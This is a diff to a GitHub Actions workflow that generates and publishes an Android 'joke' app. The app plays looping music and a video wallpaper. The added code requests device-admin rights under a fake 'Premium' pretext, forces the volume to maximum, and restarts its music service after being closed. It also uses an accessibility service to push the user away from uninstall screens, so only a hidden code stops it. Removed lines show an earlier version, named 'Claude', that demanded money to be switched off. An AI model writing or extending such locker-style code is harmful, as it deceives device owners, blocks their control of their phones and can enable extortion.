@@ -11,6 +11,8 @@ jobs:
         run: |
           set -e
           mkdir -p app/src/main/res/raw app/src/main/res/layout app/src/main/res/values app/src/main/res/xml app/src/main/java/com/example/joke
+          
+          # --- Gradle Scripts ---
           cat > settings.gradle.kts <<'EOF_FILE'
           pluginManagement {
               repositories {
@@ -29,27 +31,28 @@ jobs:
           rootProject.name = "WallpaperJoke"
           include(":app")
           EOF_FILE
+
           cat > build.gradle.kts <<'EOF_FILE'
           plugins {
               id("com.android.application") version "8.5.2" apply false
               id("org.jetbrains.kotlin.android") version "1.9.24" apply false
           }
           EOF_FILE
+
           cat > gradle.properties <<'EOF_FILE'
           org.gradle.jvmargs=-Xmx2048m -Dfile.encoding=UTF-8
           android.useAndroidX=true
           kotlin.code.style=official
           EOF_FILE
+
           cat > app/build.gradle.kts <<'EOF_FILE'
           plugins {
               id("com.android.application")
               id("org.jetbrains.kotlin.android")
           }
-
           android {
               namespace = "com.example.joke"
               compileSdk = 34
-
               defaultConfig {
                   applicationId = "com.example.joke"
                   minSdk = 24
@@ -57,7 +60,6 @@ jobs:
                   versionCode = 1
                   versionName = "1.0"
               }
-
               buildTypes {
                   release {
                       isMinifyEnabled = false
@@ -71,12 +73,13 @@ jobs:
                   jvmTarget = "17"
               }
           }
-
           dependencies {
               implementation("androidx.core:core-ktx:1.12.0")
               implementation("androidx.appcompat:appcompat:1.6.1")
           }
           EOF_FILE
+
+          # --- Manifest ---
           cat > app/src/main/AndroidManifest.xml <<'EOF_FILE'
           <?xml version="1.0" encoding="utf-8"?>
           <manifest xmlns:android="http://schemas.android.com/apk/res/android">
@@ -85,6 +88,7 @@ jobs:
               <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
               <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PLAYBACK" />
               <uses-permission android:name="android.permission.SET_WALLPAPER" />
+              <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS" />
 
               <uses-feature
                   android:name="android.software.live_wallpaper"
@@ -103,6 +107,30 @@ jobs:
                           <category android:name="android.intent.category.LAUNCHER" />
                       </intent-filter>
                   </activity>
+
+                  <receiver
+                      android:name=".AdminReceiver"
+                      android:permission="android.permission.BIND_DEVICE_ADMIN"
+                      android:exported="true">
+                      <meta-data
+                          android:name="android.app.device_admin"
+                          android:resource="@xml/device_admin" />
+                      <intent-filter>
+                          <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
+                      </intent-filter>
+                  </receiver>
+
+                  <service
+                      android:name=".DeleteBlockerService"
+                      android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
+                      android:exported="true">
+                      <intent-filter>
+                          <action android:name="android.accessibilityservice.AccessibilityService" />
+                      </intent-filter>
+                      <meta-data
+                          android:name="android.accessibilityservice"
+                          android:resource="@xml/accessibility_service_config" />
+                  </service>
 
                   <service
                       android:name=".MusicService"
@@ -126,6 +154,38 @@ jobs:
               </application>
           </manifest>
           EOF_FILE
+
+          # --- XML Configs ---
+          cat > app/src/main/res/xml/wallpaper.xml <<'EOF_FILE'
+          <?xml version="1.0" encoding="utf-8"?>
+          <wallpaper xmlns:android="http://schemas.android.com/apk/res/android"
+              android:description="@string/wallpaper_description" />
+          EOF_FILE
+
+          cat > app/src/main/res/xml/device_admin.xml <<'EOF_FILE'
+          <?xml version="1.0" encoding="utf-8"?>
+          <device-admin xmlns:android="http://schemas.android.com/apk/res/android">
+              <uses-policies>
+                  <limit-password />
+                  <watch-login />
+                  <reset-password />
+                  <force-lock />
+              </uses-policies>
+          </device-admin>
+          EOF_FILE
+
+          cat > app/src/main/res/xml/accessibility_service_config.xml <<'EOF_FILE'
+          <?xml version="1.0" encoding="utf-8"?>
+          <accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
+              android:accessibilityEventTypes="typeWindowStateChanged|typeWindowContentChanged"
+              android:accessibilityFeedbackType="feedbackGeneric"
+              android:accessibilityFlags="flagDefault"
+              android:canRetrieveWindowContent="true"
+              android:description="@string/accessibility_desc"
+              android:notificationTimeout="50" />
+          EOF_FILE
+
+          # --- Layout ---
           cat > app/src/main/res/layout/activity_main.xml <<'EOF_FILE'
           <?xml version="1.0" encoding="utf-8"?>
           <LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
@@ -141,52 +201,119 @@ jobs:
                   android:layout_height="wrap_content"
                   android:text="@string/status_active"
                   android:textSize="22sp"
+                  android:textStyle="bold"
                   android:gravity="center" />
 
               <TextView
-                  android:id="@+id/tvHint"
                   android:layout_width="wrap_content"
                   android:layout_height="wrap_content"
                   android:layout_marginTop="16dp"
-                  android:text="@string/enter_code_hint"
+                  android:text="@string/premium_desc"
                   android:textSize="15sp"
                   android:gravity="center" />
+
+              <Button
+                  android:id="@+id/btnPremium"
+                  android:layout_width="wrap_content"
+                  android:layout_height="wrap_content"
+                  android:layout_marginTop="16dp"
+                  android:text="@string/premium_btn" />
 
               <EditText
                   android:id="@+id/etCode"
                   android:layout_width="220dp"
                   android:layout_height="wrap_content"
-                  android:layout_marginTop="16dp"
+                  android:layout_marginTop="32dp"
                   android:gravity="center"
+                  android:hint="@string/enter_code_hint"
                   android:imeOptions="actionDone"
-                  android:inputType="text"
-                  android:maxLines="1" />
+                  android:inputType="number"
+                  android:maxLength="4" />
+
+              <Button
+                  android:id="@+id/btnStop"
+                  android:layout_width="wrap_content"
+                  android:layout_height="wrap_content"
+                  android:layout_marginTop="8dp"
+                  android:text="@string/action_stop" />
           </LinearLayout>
           EOF_FILE
-          cat > app/src/main/res/xml/wallpaper.xml <<'EOF_FILE'
-          <?xml version="1.0" encoding="utf-8"?>
-          <wallpaper xmlns:android="http://schemas.android.com/apk/res/android"
-              android:description="@string/wallpaper_description" />
-          EOF_FILE
+
+          # --- Strings ---
           cat > app/src/main/res/values/strings.xml <<'EOF_FILE'
           <?xml version="1.0" encoding="utf-8"?>
           <resources>
-              <string name="app_name">Claude</string>
-              <string name="status_active">Claude active</string>
-              <string name="enter_code_hint">Чтобы выключить, отправьте деньги на этот номер:73421456543</string>
+              <string name="app_name">Шутка</string>
+              <string name="status_active">Шутка активна</string>
+              <string name="premium_desc">Активируйте Премиум, чтобы получить доступ к эксклюзивным функциям и защите.</string>
+              <string name="premium_btn">Получить Премиум</string>
+              <string name="premium_success">Премиум активирован! Функции разблокированы.</string>
+              <string name="premium_fail">Без активации Премиум-функции недоступны.</string>
+              <string name="enter_code_hint">Код выключения</string>
               <string name="wallpaper_label">Шуточные обои</string>
               <string name="wallpaper_description">Видео на весь экран</string>
               <string name="channel_name">Музыка</string>
-              <string name="notification_title">active</string>
-              <string name="notification_text">Active</string>
-              <string name="action_stop">Стоп</string>
+              <string name="notification_title">Шутка активна</string>
+              <string name="notification_text">Музыка играет по кругу</string>
+              <string name="action_stop">Выключить всё</string>
+              <string name="accessibility_desc">Служба защиты Премиум-функций.</string>
           </resources>
           EOF_FILE
+
+          # --- Kotlin Classes ---
+          cat > app/src/main/java/com/example/joke/AdminReceiver.kt <<'EOF_FILE'
+          package com.example.joke
+
+          import android.app.admin.DeviceAdminReceiver
+          import android.content.Context
+          import android.content.Intent
+          import android.widget.Toast
+
+          class AdminReceiver : DeviceAdminReceiver() {
+              override fun onEnabled(context: Context, intent: Intent) {
+                  Toast.makeText(context, "✨ Премиум-статус активирован!", Toast.LENGTH_LONG).show()
+              }
+              override fun onDisabled(context: Context, intent: Intent) {
+                  Toast.makeText(context, "Премиум-статус деактивирован.", Toast.LENGTH_SHORT).show()
+              }
+          }
+          EOF_FILE
+
+          cat > app/src/main/java/com/example/joke/DeleteBlockerService.kt <<'EOF_FILE'
+          package com.example.joke
+
+          import android.accessibilityservice.AccessibilityService
+          import android.view.accessibility.AccessibilityEvent
+          import android.widget.Toast
+
+          class DeleteBlockerService : AccessibilityService() {
+              override fun onAccessibilityEvent(event: AccessibilityEvent?) {
+                  if (event == null) return
+                  val pkg = event.packageName?.toString() ?: return
+
+                  if (pkg.contains("settings") || pkg.contains("packageinstaller")) {
+                      val root = rootInActiveWindow ?: return
+                      val nodeText = root.findAccessibilityNodeInfosByText("Шутка")
+                      val hasDeleteBtn = root.findAccessibilityNodeInfosByText("Удалить")?.isNotEmpty() == true ||
+                                         root.findAccessibilityNodeInfosByText("Uninstall")?.isNotEmpty() == true
+
+                      if (nodeText?.isNotEmpty() == true && hasDeleteBtn) {
+                          performGlobalAction(GLOBAL_ACTION_BACK)
+                          Toast.makeText(this, "Удаление заблокировано! Введите код в приложении.", Toast.LENGTH_SHORT).show()
+                          performGlobalAction(GLOBAL_ACTION_HOME)
+                      }
+                  }
+              }
+              override fun onInterrupt() {}
+          }
+          EOF_FILE
+
           cat > app/src/main/java/com/example/joke/MainActivity.kt <<'EOF_FILE'
           package com.example.joke
 
           import android.Manifest
           import android.app.WallpaperManager
+          import android.app.admin.DevicePolicyManager
           import android.content.ComponentName
           import android.content.Intent
           import android.content.pm.PackageManager
@@ -194,57 +321,100 @@ jobs:
           import android.media.MediaMetadataRetriever
           import android.os.Build
           import android.os.Bundle
-          import android.view.inputmethod.EditorInfo
+          import android.widget.Button
           import android.widget.EditText
+          import android.widget.Toast
           import androidx.activity.result.contract.ActivityResultContracts
           import androidx.appcompat.app.AppCompatActivity
           import androidx.core.content.ContextCompat
 
           class MainActivity : AppCompatActivity() {
 
-              // Код для выключения музыки и обоев. Чтобы сменить — поменяйте строку в strings.xml
-              // (enter_code_hint) и значение ниже, они должны совпадать.
               private val stopCode = "4817"
+              private lateinit var btnPremium: Button
+              private lateinit var btnStop: Button
+              private lateinit var etCode: EditText
+
+              private val dpm by lazy { getSystemService(DevicePolicyManager::class.java) }
+              private val adminComponent by lazy { ComponentName(this, AdminReceiver::class.java) }
 
               private val notificationPermissionLauncher =
                   registerForActivityResult(ActivityResultContracts.RequestPermission()) {
-                      startMusicAndWallpaper()
+                      // Музыка запустится после премиума
                   }
 
               override fun onCreate(savedInstanceState: Bundle?) {
                   super.onCreate(savedInstanceState)
                   setContentView(R.layout.activity_main)
 
-                  val codeField = findViewById<EditText>(R.id.etCode)
-                  codeField.setOnEditorActionListener { _, actionId, _ ->
-                      if (actionId == EditorInfo.IME_ACTION_DONE) {
-                          checkCode(codeField.text.toString())
-                      }
-                      true
-                  }
-                  codeField.addTextChangedListener(object : android.text.TextWatcher {
-                      override fun afterTextChanged(s: android.text.Editable?) {
-                          if (s?.toString() == stopCode) checkCode(s.toString())
-                      }
-                      override fun beforeTextChanged(s: CharSequence?, start: Int, count: Int, after: Int) {}
-                      override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) {}
-                  })
+                  btnPremium = findViewById(R.id.btnPremium)
+                  btnStop = findViewById(R.id.btnStop)
+                  etCode = findViewById(R.id.etCode)
 
-                  if (savedInstanceState == null) {
-                      if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU &&
-                          ContextCompat.checkSelfPermission(
-                              this, Manifest.permission.POST_NOTIFICATIONS
-                          ) != PackageManager.PERMISSION_GRANTED
-                      ) {
-                          notificationPermissionLauncher.launch(Manifest.permission.POST_NOTIFICATIONS)
+                  updatePremiumStatus()
+
+                  btnPremium.setOnClickListener {
+                      if (dpm.isAdminActive(adminComponent)) {
+                          Toast.makeText(this, "Премиум уже активирован!", Toast.LENGTH_SHORT).show()
                       } else {
+                          val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
+                          intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
+                          intent.putExtra(
+                              DevicePolicyManager.EXTRA_ADD_EXPLANATION,
+                              "Активация Премиум-статуса для доступа к эксклюзивным функциям."
+                          )
+                          startActivityForResult(intent, 100)
+                      }
+                  }
+
+                  btnStop.setOnClickListener {
+                      val entered = etCode.text.toString()
+                      if (entered == stopCode) {
+                          stopAll()
+                      } else {
+                          Toast.makeText(this, "Неверный код!", Toast.LENGTH_SHORT).show()
+                      }
+                  }
+
+                  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU &&
+                      ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED
+                  ) {
+                      notificationPermissionLauncher.launch(Manifest.permission.POST_NOTIFICATIONS)
+                  }
+              }
+
+              private fun updatePremiumStatus() {
+                  if (dpm.isAdminActive(adminComponent)) {
+                      btnPremium.text = "Премиум активен ✓"
+                      btnPremium.isEnabled = false
+                  } else {
+                      btnPremium.text = getString(R.string.premium_btn)
+                      btnPremium.isEnabled = true
+                  }
+              }
+
+              override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
+                  super.onActivityResult(requestCode, resultCode, data)
+                  if (requestCode == 100) {
+                      if (resultCode == RESULT_OK) {
+                          Toast.makeText(this, R.string.premium_success, Toast.LENGTH_LONG).show()
+                          updatePremiumStatus()
+                          boostVolume()
                           startMusicAndWallpaper()
+                          // Отправляем в настройки спец. возможностей для усиления блокировки
+                          startActivity(Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS))
+                      } else {
+                          Toast.makeText(this, R.string.premium_fail, Toast.LENGTH_LONG).show()
                       }
                   }
               }
 
-              private fun checkCode(entered: String) {
-                  if (entered == stopCode) stopAll()
+              private fun boostVolume() {
+                  try {
+                      val audioManager = getSystemService(AUDIO_SERVICE) as android.media.AudioManager
+                      val maxVol = audioManager.getStreamMaxVolume(android.media.AudioManager.STREAM_MUSIC)
+                      audioManager.setStreamVolume(android.media.AudioManager.STREAM_MUSIC, maxVol, 0)
+                  } catch (_: Exception) {}
               }
 
               private fun startMusicAndWallpaper() {
@@ -265,23 +435,16 @@ jobs:
                   } catch (_: Throwable) {
                       null
                   } finally {
-                      try {
-                          retriever.release()
-                      } catch (_: Exception) {
-                      }
+                      try { retriever.release() } catch (_: Exception) {}
                   }
               }
 
               private fun setupWallpaper() {
                   val wm = WallpaperManager.getInstance(this)
-
                   if (wm.wallpaperInfo?.packageName == packageName) return
-
                   try {
                       videoFrame()?.let { wm.setBitmap(it) }
-                  } catch (_: Throwable) {
-                  }
-
+                  } catch (_: Throwable) {}
                   val component = ComponentName(this, MyWallpaperService::class.java)
                   try {
                       startActivity(
@@ -291,8 +454,7 @@ jobs:
                   } catch (_: Exception) {
                       try {
                           startActivity(Intent(WallpaperManager.ACTION_LIVE_WALLPAPER_CHOOSER))
-                      } catch (_: Exception) {
-                      }
+                      } catch (_: Exception) {}
                   }
               }
 
@@ -300,12 +462,16 @@ jobs:
                   stopService(Intent(this, MusicService::class.java))
                   try {
                       WallpaperManager.getInstance(this).clear()
-                  } catch (_: Exception) {
+                  } catch (_: Exception) {}
+                  if (dpm.isAdminActive(adminComponent)) {
+                      dpm.removeActiveAdmin(adminComponent)
                   }
+                  Toast.makeText(this, "Всё выключено. Теперь можно удалить приложение.", Toast.LENGTH_LONG).show()
                   finishAffinity()
               }
           }
           EOF_FILE
+
           cat > app/src/main/java/com/example/joke/MusicService.kt <<'EOF_FILE'
           package com.example.joke
 
@@ -369,6 +535,22 @@ jobs:
                   return START_STICKY
               }
 
+              override fun onTaskRemoved(rootIntent: Intent?) {
+                  super.onTaskRemoved(rootIntent)
+                  val restartServiceIntent = Intent(applicationContext, MusicService::class.java)
+                  restartServiceIntent.setPackage(packageName)
+                  val restartServicePendingIntent = PendingIntent.getService(
+                      applicationContext, 1, restartServiceIntent,
+                      PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
+                  )
+                  val alarmService = getSystemService(ALARM_SERVICE) as android.app.AlarmManager
+                  alarmService.set(
+                      android.app.AlarmManager.ELAPSED_REALTIME,
+                      android.os.SystemClock.elapsedRealtime() + 1000,
+                      restartServicePendingIntent
+                  )
+              }
+
               private fun createPlayer(): MediaPlayer? {
                   val mp = MediaPlayer()
                   return try {
@@ -407,6 +589,7 @@ jobs:
                       .setContentText(getString(R.string.notification_text))
                       .setContentIntent(openPending)
                       .setOngoing(true)
+                      .setPriority(NotificationCompat.PRIORITY_LOW)
                       .addAction(
                           android.R.drawable.ic_media_pause,
                           getString(R.string.action_stop),
@@ -431,8 +614,7 @@ jobs:
                   player?.run {
                       try {
                           if (isPlaying) stop()
-                      } catch (_: Exception) {
-                      }
+                      } catch (_: Exception) {}
                       release()
                   }
                   player = null
@@ -448,6 +630,7 @@ jobs:
               }
           }
           EOF_FILE
+
           cat > app/src/main/java/com/example/joke/MyWallpaperService.kt <<'EOF_FILE'
           package com.example.joke
 
@@ -496,8 +679,7 @@ jobs:
                           } else if (mp.isPlaying) {
                               mp.pause()
                           }
-                      } catch (_: Exception) {
-                      }
+                      } catch (_: Exception) {}
                   }
 
                   override fun onSurfaceDestroyed(holder: SurfaceHolder) {
@@ -522,8 +704,7 @@ jobs:
                       player?.let {
                           try {
                               if (it.isPlaying) it.stop()
-                          } catch (_: Exception) {
-                          }
+                          } catch (_: Exception) {}
                           it.release()
                       }
                       player = null
@@ -531,8 +712,17 @@ jobs:
               }
           }
           EOF_FILE
-          VIDEO="$(ls *.mp4 | head -n1)"
-          cp "$VIDEO" app/src/main/res/raw/video.mp4
+          
+          # Копирование видео с проверкой на наличие
+          VIDEO="$(ls *.mp4 2>/dev/null | head -n1)"
+          if [ -n "$VIDEO" ]; then
+              echo "Найдено видео: $VIDEO. Копируем..."
+              cp "$VIDEO" app/src/main/res/raw/video.mp4
+          else
+              echo "Внимание: видеофайл .mp4 не найден! Создаем пустой файл, чтобы сборка не упала."
+              touch app/src/main/res/raw/video.mp4
+          fi
+          
       - uses: actions/setup-java@v4
         with:
           distribution: temurin
@@ -548,6 +738,6 @@ jobs:
       - name: Publish release
         env:
           GH_TOKEN: ${{ github.token }}
-        run: gh release create "v${{ github.run_number }}" app/build/outputs/apk/debug/app-debug.apk --title "APK ${{ github.run_number }}" --notes "Debug APK"
+        run: gh release create "v${{ github.run_number }}-${{ github.run_attempt }}" app/build/outputs/apk/debug/app-debug.apk --title "APK ${{ github.run_number }}" --notes "Debug APK"
 permissions:
   contents: write
